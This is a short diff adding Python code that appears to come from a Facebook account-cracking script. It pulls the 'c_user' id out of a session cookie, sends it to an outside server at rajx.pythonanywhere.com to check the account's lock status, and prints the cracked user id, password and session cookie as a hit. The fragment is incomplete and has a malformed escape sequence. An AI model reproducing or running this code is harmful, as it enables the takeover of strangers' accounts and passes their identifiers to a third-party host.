@@ -1,1 +1,8 @@
-
+cix = coki.split('c_user')[1]
+                cid = cix[0:15]
+                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={cid}").text
+                if 'LOCK' in res:
+                    return 'LOCK'
+                else:
+                    print(f'  \\33[1;92m  [NOT-X] '+uid+' • '+ps+'\3[0;92m')
+                    print(f'  \\33[1;92m  [COOKIE] '+cokie)
